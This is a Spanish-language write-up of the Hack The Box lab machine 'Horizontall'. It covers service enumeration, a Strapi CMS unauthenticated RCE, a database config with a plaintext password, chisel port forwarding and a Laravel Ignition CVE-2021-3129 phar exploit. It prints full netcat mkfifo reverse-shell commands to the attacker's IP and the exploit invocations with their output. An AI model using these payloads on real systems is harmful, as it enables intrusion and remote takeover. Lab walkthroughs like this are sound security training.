---
title: Horizontall (Hack The Box)
author: J0lm3d0
date: 2022-02-05 21:00:00 +0200
categories: [HackTheBox]
tags: [linux]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de la máquina Horizontall de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.

![Logo de la máquina](/assets/img/HTB/Horizontall/machine.png)

[Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_Horizontall.pdf)

## Enumeración de servicios y recopilación de información sensible

Para comenzar, realizo un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```
# nmap -p- --open -T5 -n -vv 10.10.11.104

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```
# nmap -p 22,80 -sC -sV 10.10.11.104

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Gracias al script "http-title" de *Nmap* que muestra el título de la página web que devuelve el servidor al acceder a "http://10.10.11.104", veo que no se ha podido redirigir al dominio "horizontall.htb", por lo que parece que se está aplicando "Virtual Hosting", que se trata de una técnica que permite tener una cantidad variable de dominios y sitios web en una misma máquina. Por tanto, añado este dominio al fichero "/etc/hosts" de mi máquina de atacante de la siguiente forma:

```
# cat /etc/hosts

10.10.11.105    horizontall.htb
```

Tras haber añadido el dominio al fichero "/etc/hosts" accedo desde el navegador y veo la siguiente página:

![Página principal del servidor web](/assets/img/HTB/Horizontall/mainpage.png)

La página continúa con más información si nos desplazamos hacia abajo, pero nada relevante que pueda ayudarnos, solo información sobre los servicios que ofrece "Horizontall". También hay varios botones y el típico formulario de "Contáctanos", pero nada es funcional. En el código fuente tampoco encuentro nada raro, por lo que procedo a buscar directorios y/o archivos mediante la herramienta `Gobuster`. Pero tampoco encuentro nada especial, el "index.html" que ya habíamos visto y tres directorios: "img", "css" y "js".

```
# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x php,txt,html -u http://horizontall.htb

/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/index.html           (Status: 200) [Size: 901]                                  
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
```

Veo que los tres directorios muestran un código 301 y redirigen a otra ruta (es la misma, pero con el carácter "/" al final). Al acceder a la ruta a la que redirige cada uno de los directorios, me encuentro con que me devuelven un código 403 Forbidden, por lo que la capacidad de acceder a estas rutas se encuentra restringida.

![Acceso restringido a los directorios "img", "css" y "js" del servidor web](/assets/img/HTB/Horizontall/forbidden.png)

Aunque el acceso a estas rutas esté restringido, es posible que si se pueda acceder y ver los ficheros que las componen. Por ello, vuelvo a realizar una búsqueda de ficheros en las rutas descubiertas anteriormente, pero no descubro nada en ninguna de las búsqueda. Por tanto, al haber descubierto un dominio previamente, se me ocurre realizar una búsqueda de subdominios.

```
# gobuster vhost -w subdomains-top1million-110000.txt -u horizontall.htb -t 80

Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
```

Gracias a *Gobuster*, descubro el subdominio "api-prod.horizontall.htb". Tras esto, accedo a la página web, pero solo muestra un mensaje de bienvenida.

![Página principal del subdominio "api-prod.horizontall.htb"](/assets/img/HTB/Horizontall/apiprodpage.png)

Por tanto, realizo de nuevo una búsqueda de directorios y ficheros ocultos en este subdominio descubierto.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb -t 80

/admin                (Status: 200) [Size: 854]
/users                (Status: 403) [Size: 60]
/reviews              (Status: 200) [Size: 507]
```

Como la ruta "users" nos devuelve un código 403 Forbidden, accedo a las rutas "reviews" y "admin" desde el navegador:

![Página "reviews" del subdominio encontrado](/assets/img/HTB/Horizontall/reviewspage.png)

![Página "admin" del subdominio encontrado](/assets/img/HTB/Horizontall/adminpage.png)

En la ruta "admin", vemos un panel de inicio de sesión y un nombre: **Strapi**, que podría corresponder al nombre del gestor de contenidos (CMS) utilizado. Como no dispongo de ningunas credenciales, intento buscar algún exploit para este servicio que pueda aprovechar.

```
# searchsploit Strapi

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                                                                       | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                                                                     | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                                               | multiple/webapps/50239.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Acceso a la máquina

No conozco la versión de Strapi que se está utilizando, pero decido probar el último exploit de la lista, que permite una ejecución remota de código sin necesidad de estar autenticado. Compruebo la funcionalidad del exploit y veo que se aprovecha de un error a la hora de realizar un cambio de contraseña para establecer una nueva contraseña ("SuperStrongPassword1" en este caso) en el usuario administrador y así conseguir una RCE ciega (no veremos la salida de los comandos que ejecutemos). Por tanto, me envio una shell a mi máquina de atacante mediante `NetCat`.

```
# python3 strapi_rce.py http://api-prod.horizontall.htb

[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM1MDA3MDMxLCJleHAiOjE2Mzc1OTkwMzF9.yF54Ajvxl1o6HhEKwx7uevlLCJNyEzQEZltPT6soDh8


$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.159 443 >/tmp/f




#  nc -lvnp 443

listening on [any] 443 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.11.105] 44000
bash: cannot set terminal process group (1784): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$
```

El usuario mediante el que accedemos es "strapi". Enumerando el sistema veo que existe el usuario "developer" y que la primera flag se encuentra en su directorio personal, aunque con los permisos de "strapi" puedo visualizarla.

```
strapi@horizontall:~/myapi$ cat /etc/passwd | grep "sh$"

root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
strapi:x:1001:1001::/opt/strapi:/bin/sh
strapi@horizontall:~/myapi$ cat /home/developer/user.txt
```

```
strapi@horizontall:/home/developer$ cat user.txt

0a4efbf88e27dbf4c7035536289baa9f
```

## Escalada de privilegios

Tras obtener la flag de usuario, me dispongo a enumerar el sistema en busca de alguna forma que me permita escalar privilegios para convertirme en el usuario "developer" o, directamente, en root. En una de las rutas del directorio personal de "strapi" (/opt/strapi) encuentro un fichero JSON con credenciales para una base de datos de MySQL que se encuentra en el servidor de la propia máquina.

```
strapi@horizontall:~/myapi$ cat config/environments/development/database.json

{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
```

Pero, tras acceder a la base de datos, solo encuentro las credenciales del usuario "admin" de Strapi que había modificado previamente con el exploit utilizado. También intento utilizar la contraseña para migrarme al usuario "developer" mediante "su" y conectándome mediante el servicio SSH, pero no da resultado.

Por tanto, continuo enumerando la máquina (privilegios de "sudo", binarios con bit SUID activado, capabilities...) y, al identificar los puertos por los que la máquina está escuchando peticiones, algo me llama la atención. Los puertos 22 y 80 son aquellos por los que está escuchando peticiones a través de cualquier interfaz de red y, por ello, coinciden con los que detecte en mi primer escaneo. Por otra parte, los puertos 1337, 3306 y 8000 están escuchando peticiones solo de forma local, es decir, de la propia máquina.

```
strapi@horizontall:~/myapi$ netstat -natup | grep "LISTEN"

tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1859/node /usr/bin/
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

En el puerto 1337 se encuentra el servicio de `Node.js`, que se está encargando de procesar ciertas peticiones del servidor web; el 3306 es el servidor de MySQL que contiene la base de datos de Strapi a la que accedí anteriormente; y, del puerto 8000 no tengo ningún tipo de información. Entonces, para averiguar el contenido de este puerto, y al no contar con credenciales para conectarme por SSH, decido emplear la herramienta `Chisel` para realizar un **port forwarding** que redirija el tráfico del puerto 8000 de mi máquina de atacante al puerto 8000 de la máquina víctima, lo cual me permitirá comprobar el servicio que se está ejecutando en dicho puerto.

Para ello, hay que seguir los siguientes pasos:

1. Transferir el ejecutable de Chisel a la máquina víctima.
2. Levantar un servidor de Chisel en la máquina ofensiva que escuche peticiones en un determinado puerto.
3. Ejecutar Chisel en la máquina víctima, especificando la IP y puerto del servidor y definiendo las reglas correspondientes al redireccionamiento de puertos que se quiere realizar.

```
# chisel server -p 5001 --reverse

2021/10/31 18:48:16 server: Reverse tunnelling enabled
2021/10/31 18:48:16 server: Fingerprint IlFjG0RClS1yXjz7CNrb8tm0LgLeXFBblTuH/zgBgMk=
2021/10/31 18:48:16 server: Listening on http://0.0.0.0:5001
2021/10/31 18:48:19 server: session#1: tun: proxy#R:8000=>localhost:8000: Listening

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

strapi@horizontall:/tmp$ ./chisel client 10.10.15.36:5001 R:8000:localhost:8000

2021/10/31 22:48:19 client: Connecting to ws://10.10.15.36:5001
2021/10/31 22:48:20 client: Connected (Latency 46.359648ms)

```

Una vez realizado el redireccionamiento, compruebo que el servicio que se ejecuta en el puerto 8000 se trata de un servicio HTTP. Por tanto, procedo a identificar su contenido a través del navegador. Tal y como se observa en la siguiente imagen, se está utilizando el framework **Laravel** (versión 8), que se utiliza para desarrollar aplicaciones web mediante PHP (versión 7.4.18):

![Página principal del servicio HTTP ejecutado en el puerto 8000](/assets/img/HTB/Horizontall/laravel.png)

Conociendo las versiones utilizadas de PHP y Laravel, busco exploits que puedan aplicar a través de *SearchSploit*, pero la búsqueda no es satisfactoria. Es por ello que decido también buscar en `GitHub`, donde encuentro el exploit que se muestra a continuación y que decido probar:

![Exploit para la vulnerabilidad CVE-2021-3129 de Laravel](/assets/img/HTB/Horizontall/githubexploit.png)

Para utilizar este exploit hay que pasarle como argumentos la URL del servicio vulnerable y un archivo ".phar" que contenga las acciones que queremos aplicar. En el propio repositorio se explica como crear este archivo ".phar" utilizando php a través de interfaz de comandos. Solo se tendría que sustituir la parte final por el comando que queremos ejecutar en la máquina que contiene el servicio vulnerable, en mi caso enviará una shell mediante *Netcat* a mi máquina de atacante por el puerto 445.

Una vez creado el fichero ".phar", ejecuto el exploit especificando la URL y el fichero creado y obtengo una conexión de la máquina víctima directamente como el usuario root, pudiendo así visualizar la flag final.

```
# php -d'phar.readonly=0' phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.15.36 445 >/tmp/f"

# python3 laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar

+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# nc -lvnp 445

listening on [any] 445 ...
connect to [10.10.15.36] from (UNKNOWN) [10.10.11.105] 41656
bash: cannot set terminal process group (40736): Inappropriate ioctl for device
bash: no job control in this shell

root@horizontall: cat /root/root.txt

869744a22986472334c66e788de16d86
```
